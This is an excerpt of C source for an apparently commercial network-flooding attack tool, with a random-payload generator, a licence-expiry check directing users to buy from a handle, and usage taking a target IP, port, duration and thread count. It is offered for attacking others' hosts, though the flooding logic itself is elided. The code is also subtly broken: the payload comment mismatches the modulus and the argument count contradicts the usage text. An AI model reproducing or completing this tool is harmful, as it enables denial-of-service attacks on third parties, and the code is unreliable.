...
void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = (rand() % 1460);  // Random byte between 0 and 255
    }
}
...
int main(int argc, char *argv[]) {
    ...
    if (local->tm_year + 1900 > EXPIRATION_YEAR ||
        ...
        printf("BINARY EXPIRED DM TO BUY :- @PYSCHOxKINGYT.\n");
        return EXIT_FAILURE;
    }

    printf("ATTACK STARTED BYE @PYSCHOxKINGYT\n");

    // Check for correct arguments
    if (argc != 5) { // Adjusted argument count
        printf("Usage: %s [ IP]  [ PORT ] [ TIME ]  [ PACKET_SENDER ] [ THREAD_COUNT ] | BYE @PYSCHOxKINGYT\n", argv[0]);
        return -1;
    }
    ...
    printf("Attack finished BYE @PYSCHOxKINGYT. All threads stopped.\n");
    return 0;
}
